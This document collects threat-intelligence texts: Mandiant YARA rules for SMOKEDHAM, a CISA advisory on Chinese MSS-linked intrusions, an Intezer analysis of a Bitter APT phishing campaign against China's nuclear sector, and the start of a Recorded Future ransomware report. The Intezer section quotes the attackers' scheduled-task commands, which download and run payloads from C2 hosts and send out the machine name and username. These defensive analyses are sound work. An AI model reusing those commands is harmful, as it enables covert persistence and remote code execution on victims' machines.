Yara Detections rule Backdoor_Win_SMOKEDHAM { meta: author = "Mandiant" date_created = "2021-06-10" md5 = "9de326bf37270776b78e30d442bda48b" strings: $C2Method = { 2E 4D 65 74 68 6F 64 20 3D 20 22 50 4F 53 54 22 } //.Method = "POST" $domainFrontingDomain = /\.[hH]ost\s*=\s*\"[^\"]*";/ $envCollection1 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74 56 61 72 69 61 62 6C 65 28 22 43 4F 4D 50 55 54 45 52 4E 41 4D 45 22 29 } //Environment.
GetEnvironmentVariable("COMPUTERNAME") $envCollection2 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74 56 61 72 69 61 62 6C 65 28 22 55 53 45 52 44 4F 4D 41 49 4E 22 29 } //Environment.
GetEnvironmentVariable("USERDOMAIN") $envCollection3 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74 56 61 72 69 61 62 6C 65 28 22 55 53 45 52 4E 41 4D 45 22 29 } //Environment.GetEnvironmentVariable("USERNAME
") $functionalityString1 = { 28 22 64 65 6C 61 79 22 29 } //("delay") $functionalityString2 = { 28 22 73 63 72 65 65 6E 73 68 6F 74 22 29 } //("screenshot") $functionalityString3 = { 28 22 65 78 69 74 22 29 } //("exit") $publicStrings1 = "public string UUID" $publicStrings2 = "public string ID" $publicStrings3 = "public string Data" $UserAgentRequest = { 20 3D 20 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 4F 53 56 65 72 73 69 6F 6E 2E 54 6F 53 74 72 69 6E 67 28 29 3B } // = Environment.OSVersion.
ToString(); condition: filesize < 1MB and all of them } rule Loader_Win_SMOKEDHAM { meta: author = "Mandiant" date_created = "2021-06-10" md5 = "05d38c7e957092f7d0ebfc7bf1eb5365" strings: $listedDLLs1 = "System.Drawing.dll" fullword $listedDLLs2 = "System.Web.Extensions.dll" fullword $listedDLLs3 = "System.Windows.Forms.dll" fullword $CSharpLang = {2d 4c 61 6e 67 75 61 67 65 20 43 53 68 61 72 70} // -Language CSharp $StringConversion = "convertto-securestring" nocase $SecureString1 = {5b 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 49 6e 74 65 72 6f 70 53 65 72 76 69 63 65 73 2e 4d 61 72 73 68 61 6c 5d 3a 3a 53 65 63 75 72 65 53 74 72 69 6e 67 54 6f 42 53 54 52} //[System.
Runtime.
InteropServices.
Marshal]::SecureStringToBSTR $SecureString2 = {5b 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 49 6e 74 65 72 6f 70 53 65 72 76 69 63 65 73 2e 4d 61 72 73 68 61 6c 5d 3a 3a 50 74 72 54 6f 53 74 72 69 6e 67 41 75 74 6f} //[System.
Marshal]::PtrToStringAuto condition: filesize < 1MB and (1 of ($listedDLLs*)) and $CSharpLang and $StringConversion and $SecureString1 and $SecureString2 } MITRE ATT&CK UNC2465 Tactic Description Initial Access T1189: Drive-by Compromise T1195.002: Compromise Software Supply Chain T1566: 
Phishing Execution T1053.005:
Scheduled Task T1059.001:
PowerShell T1059.005:
Visual Basic Persistence T1098: Account Manipulation T1136: Create Account T1547.001:
Registry Run Keys / Startup Folder T1547.004: Winlogon Helper DLL T1547.009:
Shortcut Modification Defense Evasion T1027: Obfuscated Files or Information T1070.006: Timestomp T1112: Modify Registry T1140: Deobfuscate/Decode Files or Information T1218.005: Mshta T1553.002:
Code Signing T1562.004:
Disable or Modify System Firewall Discovery T1012:
Query Registry T1033: System Owner/User Discovery T1082: System Information Discovery Collection T1056.001:
Keylogging T1113: Screen Capture T1560:
Archive Collected Data Impact T1486: Data Encrypted for Impact T1531: Account Access Removal Command and Control T1071.001:
Web Protocols T1090.004:
Domain Fronting T1102: Web Service T1105:
Ingress Tool Transfer T1219:
Remote Access Software T1572:
Protocol Tunneling T1573.002:
Asymmetric Cryptography Lateral Movement T1021.004: SSH T1021.005: VNC Credential Access T1003.001:
LSASS Memory Resource Development T1588.003: Code Signing Certificates T1588.004: Digital Certificates T1608.003: Install Digital Certificate Acknowledgements Thanks to everyone that contributed analysis and review.
Special thanks to Alison Stailey, Joseph Reyes, Nick Richard, Andrew Thompson, Jeremy Kennelly, Joshua Sablatura, Evan Reese, Van Ta, Stephen Eckels, and Tufail Ahmed. 
title: AA20-258A: Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity url: https://us-cert.cisa.gov/ncas/alerts/aa20-258a Original release date: September 14, 2020 | Last revised: October 24, 2020SummaryThe Cybersecurity and Infrastructure Security Agency (CISA) has consistently observed Chinese Ministry of State Security (MSS)-affiliated cyber threat actors using publicly available information sources and common, well-known tactics, techniques, and procedures (TTPs) to target U.S. Government agencies.
CISA has observed these—and other threat actors with varying degrees of skill—routinely using open-source information to plan and execute cyber operations.
CISA leveraged the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK:registered:) and Pre-ATT&CK frameworks to characterize the TTPs used by Chinese MSS-affiliated actors.
This product was written by CISA with contributions by the Federal Bureau of Investigation (FBI). 
Key Takeaways Chinese MSS-affiliated cyber threat actors use open-source information to plan and conduct cyber operations. 
Chinese MSS-affiliated cyber threat actors use readily available exploits and exploit toolkits to quickly engage target networks. 
Maintaining a rigorous patching cycle continues to be the best defense against the most frequently used attacks. 
If critical vulnerabilities remain unpatched, cyber threat actors can carry out attacks without the need to develop custom malware and exploits or use previously unknown vulnerabilities to target a network. 
This Advisory identifies some of the more common—yet most effective—TTPs employed by cyber threat actors, including Chinese MSS-affiliated cyber threat actors. 
Click here for a PDF version of this report. 
Technical DetailsThrough the operation of the National Cybersecurity Protection System (NCPS) and by fulfilling its mission as the national risk advisor, CISA has observed Chinese MSS-affiliated cyber threat actors operating from the People’s Republic of China using commercially available information sources and open-source exploitation tools to target U.S. Government agency networks. 
According to a recent U.S. Department of Justice indictment, MSS-affiliated actors have targeted various industries across the United States and other countries—including high-tech manufacturing; medical device, civil, and industrial engineering; business, educational, and gaming software; solar energy; pharmaceuticals; and defense—in a campaign that lasted over ten years.[1]
These hackers acted for both their own personal gain and the benefit of the Chinese MSS.[2] According to the indictment, To conceal the theft of information from victim networks and otherwise evade detection, the defendants typically packaged victim data in encrypted Roshal Archive Compressed files (RAR files), changed RAR file and victim documents’ names and extensions (e.g., from “.rar” to “.jpg”) and system timestamps, and concealed programs and documents at innocuous-seeming locations on victim networks and in victim networks’ “recycle bins.”
The defendants frequently returned to re-victimize companies, government entities, and organizations from which they had previously stolen data, in some cases years after the initial successful data theft.
In several instances, however, the defendants were unsuccessful in this regard, due to the efforts of the FBI and network defenders. 
The continued use of open-source tools by Chinese MSS-affiliated cyber threat actors highlights that adversaries can use relatively low-complexity capabilities to identify and exploit target networks.
In most cases, cyber operations are successful because misconfigurations and immature patch management programs allow actors to plan and execute attacks using existing vulnerabilities and known exploits.
Widespread implementation of robust configuration and patch management programs would greatly increase network security.
It would also reduce the speed and frequency of opportunistic attacks by forcing threat actors to dedicate time and funding to research unknown vulnerabilities and develop custom exploitation tools. 
MITRE PRE-ATT&CK:registered: Framework for Analysis In the last 12 months, CISA analysts have routinely observed Chinese MSS-affiliated actors using the following PRE-ATT&CK:registered: Framework TTPs. Target Selection and Technical Information Gathering Target Selection [TA0014] is a critical part of cyber operations.
While cyber threat actors’ motivations and intents are often unknown, they often make their selections based on the target network’s security posture.
Threat actors can use information sources such as Shodan, the Common Vulnerabilities and Exposure (CVE) database, and the National Vulnerabilities Database (NVD).[3][4][5] Shodan is an internet search engine that can be used to identify vulnerable devices connected to the internet.
Shodan queries can also be customized to discover specific vulnerabilities on devices, which enables sophisticated cyber threat actors to use relatively unsophisticated techniques to execute opportunistic attacks on susceptible targets. 
The CVE database and the NVD contain detailed information about vulnerabilities in applications, appliances, and operating systems that can be exploited by cyber threat actors if they remain unpatched.
These sources also provide risk assessments if any of the recorded vulnerabilities are successfully exploited. 
These information sources have legitimate uses for network defense.
CISA analysts are able to identify Federal Government systems that may be susceptible to exploitation attempts by using Shodan, the CVE database, and the NVD to enrich NCPS information.
Unlike threat actors, CISA takes the necessary actions to notify network owners of their exposure in order to prevent an impending intrusion or quickly identify intrusions as they occur. 
While using these data sources, CISA analysts have observed a correlation between the public release of a vulnerability and targeted scanning of systems identified as being vulnerable.
This correlation suggests that cyber threat actors also rely on Shodan, the CVE database, the NVD, and other open-source information to identify targets of opportunity and plan cyber operations.
Together, these data sources provide users with the understanding of a specific vulnerability, as well as a list of systems that may be vulnerable to attempted exploits.
These information sources therefore contain invaluable information that can lead cyber threat actors to implement highly effective attacks. 
CISA has observed Chinese MSS-affiliated actors using the techniques in table 1 to gather technical information to enable cyber operations against Federal Government networks (Technical Information Gathering [TA0015]). 
Table 1: Technical information gathering techniques observed by CISA MITRE ID Name Observation T1245 Determine Approach/Attack Vector 
The threat actors narrowed the attack vectors to relatively recent vulnerability disclosures with open-source exploits. 
T1247 Acquire Open Source Intelligence (OSINT) Data Sets and Information CISA observed activity from network proxy service Internet Protocol (IP) addresses to three Federal Government webpages.
This activity appeared to enable information gathering activities. 
T1254 Conduct Active Scanning CISA analysts reviewed the network activity of known threat actor IP addresses and found evidence of reconnaissance activity involving virtual security devices. 
Technical Weakness Identification CISA analysts consistently observe targeting, scanning, and probing of significant vulnerabilities within days of their emergence and disclosure.
This targeting, scanning, and probing frequently leads to compromises at the hands of sophisticated cyber threat actors.
In some cases, cyber threat actors have used the same vulnerabilities to compromise multiple organizations across many sectors.
Organizations do not appear to be mitigating known vulnerabilities as quickly as cyber threat actors are exploiting them.
CISA recently released an alert that highlighted the top 10 vulnerabilities routinely exploited by sophisticated foreign cyber threat actors from 2016 to 2019.[6] Additionally, table 2 provides a list of notable compromises by Chinese MSS-affiliated actors within the past 12 months. 
Table 2: Significant CVEs targeted by Chinese MSS-affiliated actors in the last 12 months Vulnerability Observations CVE-2020-5902:
F5 Big-IP Vulnerability CISA has conducted incident response engagements at Federal Government and commercial entities where the threat actors exploited CVE-2020-5902.
This is a vulnerability in F5’s Big-IP Traffic Management User Interface that allows cyber threat actors to execute arbitrary system commands, create or delete files, disable services, and/or execute Java code.[7] CVE-2019-19781:
Citrix Virtual Private Network (VPN)
Appliances CISA has observed the threat actors attempting to discover vulnerable Citrix VPN Appliances.
CVE-2019-19781 enabled the actors to execute directory traversal attacks.[8] CVE-2019-11510:
Pulse Secure VPN Servers CISA has conducted multiple incident response engagements at Federal Government and commercial entities where the threat actors exploited CVE-2019-11510—an arbitrary file reading vulnerability affecting Pulse Secure VPN appliances—to gain access to victim networks.
Although Pulse Secure released patches for CVE-2019-11510 in April 2019, CISA observed incidents where compromised Active Directory credentials were used months after the victim organization patched their VPN appliance.[9] CVE-2020-0688: Microsoft Exchange Server CISA has observed the actors exploiting CVE-2020-0688 for remote code execution to enable email collection of targeted networks. 
Additionally, CISA has observed Chinese MSS-affiliated actors using the techniques listed in table 3 to identify technical weaknesses in Federal Government networks (Technical Weakness Identification [TA0018]). 
Table 3: Technical weakness identification techniques observed by CISA MITRE ID Name Observation T1288 Analyze Architecture and Configuration Posture CISA observed the cyber actors scanning a Federal Government agency for vulnerable web servers.
CISA also observed the threat actors scanning for known vulnerable network appliance CVE-2019-11510. 
T1291 Research Relevant Vulnerabilities CISA has observed the threat actors scanning and reconnaissance of Federal Government internet-facing systems shortly after the disclosure of significant CVEs. Build Capabilities CISA analysts have observed cyber threat actors using command and control (C2) infrastructure as part of their cyber operations.
These observations also provide evidence that threat actors can build and maintain relatively low-complexity capabilities, such as C2, to enable cyber operations against Federal Government networks (Build Capabilities [TA0024]).
CISA has observed Chinese MSS-affiliated actors using the build capabilities summarized in table 4. Table 4: Build capabilities observed by CISA MITRE ID Name Observation T1352 C2 Protocol Development CISA observed beaconing from a Federal Government entity to the threat actors’ C2 server. 
T1328 Buy Domain Name CISA has observed the use of domains purchased by the threat actors. 
T1329 Acquire and / or use of 3rd Party Infrastructure CISA has observed the threat actors using virtual private servers to conduct cyber operations. 
T1346 Obtain/Re-use Payloads CISA has observed the threat actors use and reuse existing capabilities. 
T1349 Build or Acquire Exploit CISA has observed the threat actors using a variety of open-source and publicly available exploits and exploit code to compromise Federal Government networks. 
MITRE ATT&CK Framework for Analysis CISA has observed sophisticated cyber threat actors, including Chinese MSS-affiliated actors, using commercial and open-source tools to conduct their operations.
For example, threat actors often leverage internet software repositories such as GitHub and Exploit-DB.[10][11]
Both repositories are commonly used for legitimate development and penetration testing and developing open-source code, but cyber threat actors can also use them to find code to enable nefarious actions. 
During incident response activities, CISA frequently observed Chinese government-affiliated actors using the open-source tools outlined in table 5. Table 5: Common exploit tools CISA observed used by Chinese MSS-affiliated actors Tool Observations Cobalt Strike CISA has observed the threat actors using Cobalt Strike to target commercial and Federal Government networks.
Cobalt Strike is a commercial penetration testing tool used to conduct red team operations.
It contains a number of tools that complement the cyber threat actor’s exploitation efforts, such as a keystroke logger, file injection capability, and network services scanners.
CISA observed connections from a Federal Government agency to multiple IP addresses possibly hosting Cobalt Strike team servers. 
China Chopper Web Shell CISA has observed the actors successfully deploying China Chopper against organizations’ networks.
This open-source tool can be downloaded from internet software repositories such GitHub and Exploit-DB.
China Chopper is a web shell hosted on a web server.
It is mainly used for web application attacks, and it is configured in a client/server relationship.
China Chopper contains security scanners and can be used to upload files and brute-force passwords. 
Mimikatz CISA has observed the actors using Mimikatz during their operations.
This open-source tool is used to capture account credentials and perform privilege escalation with pass-the-hash attacks that allow an attacker to pass captured password hashes and authenticate to network devices.[12] The following sections list the ATT&CK Framework TTPs routinely employed by Chinese government-affiliated actors to conduct cyber operations as observed by CISA analysts. 
Initial Access 
In the last 12 months, CISA has observed Chinese MSS-affiliated actors use spearphishing emails with embedded links to actor-owned infrastructure and, in some cases, compromise or poison legitimate sites to enable cyber operations. 
CISA has observed the threat actors using the Initial Access [TA0001] techniques identified in table 6. Table 6: Initial access techniques observed by CISA MITRE ID Name Observation T1204.001 User Execution: Malicious Link CISA has observed indications that users have clicked malicious links embedded in spearphishing emails that the threat actors sent T1566.002 Phishing: Spearphishing Link CISA analyzed network activity of a Federal Government entity and concluded that the threat actors sent a malicious email weaponized with links. 
T1190 Exploit Public-Facing Application CISA has observed the actors leveraging CVE-2019-19781 to compromise Citrix Application Delivery Controllers. 
Cyber threat actors can continue to successfully launch these types of low-complexity attacks—as long as misconfigurations in operational environments and immature patch management programs remain in place—by taking advantage of common vulnerabilities and using readily available exploits and information. 
Execution CISA analysts continue to observe beaconing activity indicative of compromise or ongoing access to Federal Government networks.
This beaconing is a result of cyber threat actors successfully completing cyber operations that are often designed around emergent vulnerabilities and reliant on existing exploitation tools, as mentioned in this document. 
CISA has observed Chinese MSS-affiliated actors using the Execution [TA0002] technique identified in table 7. Table 7: Execution technique observed by CISA MITRE ID Name Observation T1072 Software Deployment Tools CISA observed activity from a Federal Government IP address beaconing out to the threat actors’ C2 server, which is usually an indication of compromise. 
Credential Access Cyber threat actors also continue to identify large repositories of credentials that are available on the internet to enable brute-force attacks.
While this sort of activity is not a direct result of the exploitation of emergent vulnerabilities, it demonstrates that cyber threat actors can effectively use available open-source information to accomplish their goals.
Further, a threat actor does not require a high degree of competence or sophistication to successfully carry out this kind of opportunistic attack. 
CISA has observed Chinese MSS-affiliated actors using the Credential Access
[TA0006] techniques highlighted in table 8. 
Table 8:
Credential access techniques observed by CISA MITRE ID Name Observation T1003.001 Operating System (OS)
Credential Dumping: Local Security Authority Subsystem Service (LSASS) Memory CISA observed the threat actors using Mimikatz in conjunction with coin miner protocols and software.
The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool. 
T1110.004 Brute Force: Credential Stuffing CISA observed what was likely a brute-force attack of a Remote Desktop Protocol on a public-facing server. Discovery As with any cyber operation, cyber threat actors must be able to confirm that their target is online and vulnerable—there are a multitude of open-source scanning and reconnaissance tools available to them to use for this purpose.
CISA consistently observes scanning activity across federal agencies that is indicative of discovery techniques.
CISA has observed Chinese MSS-affiliated actors scanning Federal Government traffic using the discovery technique highlighted in table 9 (Discovery [TA0007]). 
Table 9: Discovery technique observed by CISA MITRE ID Name Observation T1046 Network Service Scanning CISA has observed suspicious network scanning activity for various ports at Federal Government entities. 
Collection Within weeks of public disclosure of CVE-2020-0688, CISA analysts identified traffic that was indicative of Chinese MSS-affiliated threat actors attempting to exploit this vulnerability using the Collection [TA0009] technique listed in table 10. Table 10: Collection technique observed by CISA MITRE ID Name Observation T1114 Email Collection CISA observed the actors targeting CVE-2020-0688 to collect emails from the exchange servers found in Federal Government environments. 
Command and Control CISA analysts often observe cyber threat actors using external proxy tools or hop points to enable their cyber operations while remaining anonymous.
These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.
For example, “The Onion Router” (Tor) is often used by cyber threat actors for anonymity and C2.
Actor’s carefully choose proxy tools depending on their intended use.
These techniques are relatively low in complexity and enabled by commercially available tools, yet they are highly effective and often reliant upon existing vulnerabilities and readily available exploits. 
CISA has observed Chinese MSS-affiliated actors using the Command and Control [TA0011] techniques listed in table 11. 
Table 11: Command and control techniques observed by CISA MITRE ID Name Observation T1090.002 Proxy: External Proxy CISA observed activity from a network proxy tool to 221 unique Federal Government agency IP addresses. 
T1090.003 Proxy: Multi-hop
Proxy CISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems. 
T1573.002 Encrypted Channel: Asymmetric Cryptography CISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems. 
MitigationsCISA asserts with high confidence that sophisticated cyber threat actors will continue to use open-source resources and tools to target networks with a low security posture.
When sophisticated cyber threat actors conduct operations against soft targets, it can negatively impact critical infrastructure, federal, and state, local, tribal, territorial government networks, possibly resulting in loss of critical data or personally identifiable information. 
CISA and the FBI recommend that organizations place an increased priority on patching the vulnerabilities routinely exploited by MSS-affiliated cyber actors.
See table 12 for patch information on the CVEs mentioned in this report.
For more information on vulnerabilities routinely exploited by sophisticated cyber actors, see CISA Alert: Top 10 Routinely Exploited Vulnerabilities. 
Table 12: Patch Information for Vulnerabilities Routinely Exploited by MSS-affiliated Cyber Actors Vulnerability Vulnerable Products Patch Information CVE-2020-5902 Big-IP devices (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO, CGNAT) F5 Security Advisory: K52145254: TMUI RCE vulnerability CVE-2020-5902 CVE-2019-19781 Citrix Application Delivery Controller Citrix Gateway Citrix SDWAN WANOP Citrix blog post: firmware updates for Citrix ADC and Citrix Gateway versions 11.1 and 12.0 Citrix blog post: security updates for Citrix SD-WAN WANOP release 10.2.6 and 11.0.3 Citrix blog post: firmware updates for Citrix ADC and Citrix Gateway versions 12.1 and 13.0 Citrix blog post: firmware updates for Citrix ADC and Citrix Gateway version 10.5 CVE-2019-11510 Pulse Connect Secure 9.0R1 - 9.0R3.3, 8.3R1 - 8.3R7, 8.2R1 - 8.2R12, 8.1R1 - 8.1R15 Pulse Policy Secure 9.0R1 - 9.0R3.1, 5.4R1 - 5.4R7, 5.3R1 - 5.3R12, 5.2R1 - 5.2R12, 5.1R1 - 5.1R15 Pulse Secure Out-of-Cycle Advisory:
Multiple vulnerabilities resolved in Pulse Connect Secure /
Pulse Policy Secure 9.0RX CVE-2020-0688 Microsoft Exchange Servers Microsoft Security Advisory: CVE-2020-0688: Microsoft Exchange Validation Key Remote Code Execution Vulnerability CISA and the FBI also recommend that organizations routinely audit their configuration and patch management programs to ensure they can track and mitigate emerging threats.
Implementing a rigorous configuration and patch management program will hamper sophisticated cyber threat actors’ operations and protect organizations’ resources and information systems. 
Contact InformationTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov.
When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
To request incident response resources or technical assistance related to these threats, contact CISA at central@cisa.dhs.gov. References [1] U.S. Department of Justice Press Release [2] U.S. Department of Justice Press Release [3] Shodan
[4] MITRE Common Vulnerabilities and Exposures List [5] National Institute of Standards and Technology National Vulnerability Database
[6] CISA Alert AA20-133A: Top 10 Routinely Exploited Vulnerabilities [7] CISA Alert AA20-206A: Threat Actor Exploitation of F5 BIG-IP CVE-2020-5902
[8] CISA Alert AA20-031A: Detecting Citrix CVE-2019-19781
[9] CISA Alert AA20-107A: Continued Threat Actor Exploitation Post Pulse Secure VPN Patching [10] GitHub
[11] Exploit-DB [12] What is Mimikatz:
The Beginner's Guide (VARONIS) Revisions September 14, 2020:
Initial Version This product is provided subject to this Notification and this Privacy & Use policy. 
title: Phishing Campaign Targets Chinese Nuclear Energy Industry url: https://www.intezer.com/blog/research/phishing-campaign-targets-nuclear-energy-industry/ Intezer has been tracking activity targeting the energy sector and noted a campaign with techniques that align with those of Bitter APT, operating in the Asia-Pacific region. 
We have made the connection to Bitter APT through tactics, techniques, and procedures (TTPs) that have been observed in other publications, such as the use of Microsoft Office exploits through Excel files, and the use of CHM and Windows Installer (MSI) files.
Bitter APT is a South Asian threat group that commonly targets energy and government sectors; they have been known to target Pakistan, China, Bangladesh, and Saudi Arabia. 
Bitter APT are continuing to target organizations in China in an espionage campaign, as our here research shows.
For some of the payloads we have corresponding phishing emails that were used as lures to deliver the files, allowing analysis of the social engineering techniques used.
We have noted updates to the first-stage payloads used, with new layers of obfuscation to hinder analysis and additional decoys used for social engineering. 
Analysis of Phishing Lures and Payloads We identified seven emails pretending to be from the Embassy of Kyrgyzstan, being sent to recipients in the nuclear energy industry in China.
In some emails, people and entities in academia are also targeted, also related to nuclear energy.
The phishing emails contain a lure that invites the recipients to join conferences on subjects that are relevant to them.
The lures are designed to socially engineer the recipient to download and open an attached RAR file that contains either a Microsoft Compiled HTML Help (CHM) or Excel payload.
This activity appears to be a continuation of the tactics and campaign that Bitter APT have been using since at least 2021. 
Figure 1: Attack flow described in this research Social Engineering with Phishing Emails The emails contain a number of social engineering techniques.
The name and email address used to send the phishing emails is crafted to look like it is coming from an “Embassy in Beijing.”
A free email provider is used, therefore domain reputation checks will not be useful. 
Figure 2: Name crafted to appear as communication from an embassy The email is signed off with the name and details of an actual attaché of the Kyrgyz embassy in China.
If the recipient were to use a search engine to check for this employee, they would easily be able to find corroborating information from LinkedIn and the Ministry of Foreign Affairs website for Kyrgyzstan, adding to the supposed legitimacy of the email.
This is presumably also how the malicious actor was able to get information in order to craft the lure. 
The email subject and body use terms and themes that would be familiar with the recipients in governmental and energy sectors, such as International Atomic Energy Agency (IAEA), China Institute of International Studies (CIIS), strategic alliances, and nuclear doctrines. 
Figure 3: Email body lure with nuclear themes Malicious Payloads via CHM and Microsoft Excel Files Multiple payloads have been observed being delivered.
Either CHM files, or Microsoft Excel files with Equation Editor exploits.
These payloads are compressed inside RAR files, this helps avoid static analysis techniques that do not decompress the files first.
The purpose of the payloads are to create persistence and download further malware payloads.
We were not able to get further additional payloads from the command and control (C2) servers, but in some instances were able to get the file names of next stages from active C2s. 
Malicious Microsoft Excel Files The Excel payloads simply contain an Equation Editor exploit that creates two different scheduled tasks.
There is no decoy in the document.
One scheduled task (shown below) runs every 15 minutes, to download a next stage EXE payload using cURL, also sending the actor the name of the infected machine.
These tactics have been observed being used by Bitter APT in 2021/2022. 
"C:\Windows\System32\schtasks.exe" /create /sc MINUTE /mo 15 /TN \Windows\DWM\DWMCORE /TR "cmd /c start /min
curl --output
%AppData%\dwmcor.exe
-O ""https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&ct=QT""" /f Figure 4: Scheduled task The second scheduled task created attempts to execute the payload downloaded by the other task: "C:\Windows\System32\schtasks.exe" /create /sc MINUTE /mo 20 /TN \Windows\DWM\DWMCORELIB /TR
"%AppData%\dwmcor.exe" /f CHM Files The more common payloads contained within the RAR files are Microsoft Compiled HTML Help (CHM) files.
These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.
We have noted multiple versions of these CHM payloads.
CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Office installed like the Excel files, and it also uses LZX compression that will bypass static malware analysis solutions that do not decompress the file. 
The first version of the CHM file will create a scheduled task that will use the living off the land binary msiexec to execute a remote MSI payload from the C2.
String concatenation is used to break up the string for obfuscation.
The computer name and the username is also sent to the C2. 
"C:\Windows\System32\schtasks.exe" /create /sc minute /mo 15 /tn
AdobeUpdater /tr
"%coMSPec% /c
s^t^a^rt /^m^i^n m^s^i^e^xe^c
^/^i htt^p:/^/mirz^adih^atti^[.]com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart" /ft 
We did not fetch any additional payloads from the C2, but we were served empty MSI files, allowing us to discover the names of the next stage payloads. 
Figure 5: Empty payloads served from different C2 servers This may allow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target looks promising enough, thus protecting the next stage of the attack.
Bitter APT do not appear to change their tactics too much, therefore we can assume that the payloads will be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keylogger, remote access tool, file stealer, or browser credential stealer. 
The second version of the CHM payload abstracts the same activity through an encoded PowerShell command stage, obfuscating the activity further than just simple string concatenation. 
Figure 6: Encoded PowerShell command in version 2 of the CHM files 
The decoded command is the following: schtasks /create
/tn
WinSecurity /sc minute /mo 15 /tr
"powershell.exe -WindowStyle
Hidden -command curl -o %
LOCALAPPDATA%\pic.jpg https://coauthcn[.]com/hbz.php?id=%computername%;timeout 9;more %LOCALAPPDATA%\pic.jpg|powershell;timeout 9;del %LOCALAPPDATA%\pic.jpg" /f 
It is evident that the C2 controllers have been updated also as now only the computer name is sent to the C2 and not the username.
What is interesting about the next version is that it now contains a decoy picture when opened: Figure 7: Decoy picture The decoy appears to reference the United Front Work Department of the Central Committee of the Chinese Communist Party.
The following is a machine translated version of the same picture for reference (please note that the translation will not be fully accurate and should be used for reference purposes only): Figure 8: Machine translated version of the decoy Conclusion Bitter APT have been conducting espionage campaigns for years using many tactics, including phishing, to achieve their goals.
It is advised that entities in government, energy, and engineering especially those in the Asia-Pacific region should remain vigilant when receiving emails, especially those claiming to be from other diplomatic entities.
Always verify that the sender is trusted and understand that even if it claims to be from a particular person, it might not be.
None of the social engineering techniques used are novel and it is imperative that employees of companies should have a good standard of security awareness about phishing emails. 
Always take care when handling attachments, and never open CHM files as they are antiquated and not commonly used for legitimate purposes currently. 
– Want to learn more about automating your pipeline for phishing email investigations with Intezer? 
Book a time to talk with us. – Indicators of Compromise File Hashes (SHA256) 5f663f15701f429f17cc309d10ca03ee00fd20f733220cc9d2502eff5d0cd1a1
(Email) 
eb7aebded5549f8b006e19052e0d03dc9095c75a800897ff14ef872f18c8650e (Email) cac239cf09a6a5bc1f9a3b29141336773c957d570212b97f73e13122fe032179 (Email) 8d2f6b0d7a6a06708593cc64d9187878ea9d2cc3ae9a657926aa2a8522b93f74 (Email) 33905e2db3775d2e8e75c61e678d193ac2bab5b5a89d798effbceb9ab202d799 (Email) 5c85194ade91736a12b1eeeb13baa0b0da88c5085ca0530c4f1d86342170b3bc (Email) Ef4fb1dc3d1ca5ea8a88cd94596722b93524f928d87dff0d451d44da4e9181f1 (Email) b2566755235c1df3371a7650d94339e839efaa85279656aa9ab4dc4f2d94bbfa (RAR) 33a20950e7f4b2191706ddf9089f1e91be1e5384cca00a57cf6b58056f70c96b (RAR) 7e7e90b076ef3ea4ef8ed4ef14fb599a2acb15d9ce00c78e5949186da1e355cf (RAR) 07504fcef717e6b74ed381e94eab5a9140171572b5572cda87b275e3873c8a88 (XLS) 06b4c1f46845cee123b2200324a3ebb7fdbea8e2c6ef4135e3f943bd546a2431 (CHM) ded0635c5ef9c3d63543abc36a69b1176875dba84ca005999986bd655da3a446 (CHM) Network qwavemediaservice[.]net mirzadihatti[.]com coauthcn[.]com Mitre ATT&CK TacticTechniqueIDDescriptionReconnaissanceEmail AddressesT1589.002The actor gathers target email addresses to target with spearphishing emailsInitial AccessSpearphishing AttachmentT1566.001Spearphishing is used to deliver RAR attachmentsExecutionPowerShellT1059.001Encoded PowerShell is used by CHM payloadExecutionExploitation for Client ExecutionT1203Microsoft Office exploits are used to execute codePersistenceScheduled TaskT1053.005Scheduled Tasks used for both execution and persistenceDefense EvasionMsiexecT1218.007Msiexec is used to launch next stage payloadsDefense
EvasionCompiled HTML FileT1218.001CHM files are used to deliver payloadsDefense EvasionMasqueradingT1036Files are masqueraded as legitimate files and scheduled tasks are named after common tasks (eg.
Adobe Updater)DiscoverySystem Information DiscoveryT1082First stage payloads fetch Computer and User namesCommand and ControlWeb ProtocolsT1071.001HTTPS is used for C2 communicationCommand and ControlExfiltration Over C2 ChannelT1041Data can be exfiltrated The post Phishing Campaign Targets Chinese Nuclear Energy Industry appeared first on Intezer. 
title: Latin American Governments Targeted By Ransomware url: https://www.recordedfuture.com/latin-american-governments-targeted-by-ransomware Recorded Future examined the recent escalation of cyberattacks on Latin American (LATAM) governments from January 2022 until May 2022.
We analyzed vulnerabilities, attack vectors, and indicators of compromise (IOCs), identified the most prevalent ransomware gangs targeting LATAM governments, and highlighted the lack of proper cybersecurity hygiene in the region.
This report includes information gathered using the Recorded Future Platform, dark web sources, and open-source intelligence techniques (OSINT).Executive SummaryWe identified several government entities in Latin America (LATAM) that have been affected by ransomware attacks, likely involving Russian or Russian-speaking threat actors, beginning on or around April 2022.
